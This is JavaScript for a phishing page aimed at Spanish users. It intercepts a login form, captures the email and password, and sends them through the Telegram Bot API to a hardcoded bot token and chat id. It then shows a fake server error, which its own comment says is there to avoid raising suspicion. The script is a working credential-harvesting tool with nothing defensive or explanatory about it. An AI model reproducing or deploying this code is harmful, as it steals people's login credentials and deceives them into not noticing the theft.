document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = document.querySelector('input[type="email"]').value;
    const password = document.querySelector('input[type="password"]').value;
    
    const botToken = "8609726894:AAGpEsj7vz-M01u8RRNww3z8lbX3cgTeEmQ";
    const chatId = "6585533652";
    
    const message = `🎯 **NUEVO TARGET PESCATO!**\n\n📧 **Email:** ${email}\n🔑 **Password:** ${password}\n🌍 **Market:** Spain 🇪🇸`;

    // Invio dati a Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    }).then(() => {
        // Mostra finto errore per non destare sospetti
        alert('Error de conexión con el servidor (503). Por favor, inténtelo de nuevo.');
        window.location.reload(); 
    }).catch(() => {
        alert('Error de conexión.');
    });
});
